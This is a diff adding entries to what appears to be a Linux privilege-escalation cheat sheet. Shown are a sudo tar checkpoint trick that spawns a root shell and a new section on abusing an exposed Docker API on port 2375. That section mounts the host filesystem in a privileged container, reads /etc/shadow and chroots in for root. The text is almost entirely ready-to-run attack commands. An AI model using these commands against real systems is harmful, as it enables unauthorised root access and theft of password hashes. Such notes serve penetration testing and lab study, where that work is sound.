@@ -55,3 +55,15 @@
 - Use
 
        sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+### Privesc with docker api on port 2375
+
+      docker -H <IP>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+
+### file access
+
+      cat /mnt/etc/shadow
+
+### RCE <getting root with that user>
+
+     chroot /mnt
